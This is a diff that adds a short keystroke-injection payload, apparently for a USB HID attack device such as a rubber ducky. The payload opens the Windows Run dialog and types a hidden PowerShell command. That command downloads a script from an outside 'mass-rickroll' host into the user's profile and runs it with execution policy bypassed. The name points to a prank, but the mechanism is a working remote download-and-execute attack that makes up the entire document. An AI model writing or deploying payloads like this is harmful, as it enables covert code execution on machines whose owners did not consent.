@@ -1,0 +1,15 @@
+REM Begin with a delay to ensure the target machine is ready to recognize the device
+DELAY 1000
+
+REM Open the Run dialog by simulating pressing Windows + R keys
+HOTKEY GUI R
+DELAY 600
+
+REM Type the PowerShell command to download and execute a script from the specified URL
+STRING powershell -WindowStyle hidden -C wget 'http://mass-rickroll.host.qrl.nz/script.ps1' -o $env:USERPROFILE\\joe.ps1;PowerShell -WindowStyle hidden -NoProfile -ExecutionPolicy Bypass $env:USERPROFILE\\joe.ps1
+DELAY 600
+
+PRESS ENTER
+
+REM It keeps repeating??
+DELAY 600000
